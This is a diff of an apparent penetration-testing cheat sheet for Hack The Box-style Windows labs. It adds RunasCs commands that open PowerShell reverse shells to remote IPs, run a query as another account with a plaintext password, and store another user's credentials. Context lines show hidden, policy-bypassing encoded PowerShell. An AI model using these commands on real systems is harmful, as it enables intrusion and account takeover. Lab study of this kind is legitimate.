@@ -214,8 +214,11 @@ net accounts
 # Prefer RunasCs.exe rather than runas.exe. The latter often fails silently w/ explaination.
 # run as <USER>, useful if the user is not in the REMOTE GROUP
 # upload RunasCs
-.\RunasCs.exe <USER> <PASSWORD>  powershell.exe -r 10.10.14.84:6666
-.\RunasCS.exe /user:<DOMAIN>\<USER> <PASS>  powershell.exe (-r 10.10.16.48:6666)
+
+.\RunasCs.exe <USER> <PASSWORD>  "powershell.exe -r 10.10.14.84:6666"
+.\RunasCS.exe /user:<DOMAIN>\<USER> <PASS> "powershell.exe (-r 10.10.16.48:6666)"
+
+./RunasCs.exe svc_ldap M1XyC9pW7qT5Vn "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Get-ADObject -Filter 'isDeleted -eq `$true' -IncludeDeletedObjects -Properties distinguishedName, objectSid - SearchBase 'CN=Deleted Objects,DC=voleur,DC=htb'"
 ```
 
 ## powershell - find hijackable COM object
@@ -255,4 +258,11 @@ cat pwsh-rev.ps1 | iconv -t UTF-16LE | base64 -w 0
 
 # In powershell execute : 
 powershell -nop -W hidden -noni -ep bypass -encodedCommand "...."
+```
+
+## powershell - Store another user's creds
+```
+# powershell - Store another user's creds
+$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force 
+$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
 ```
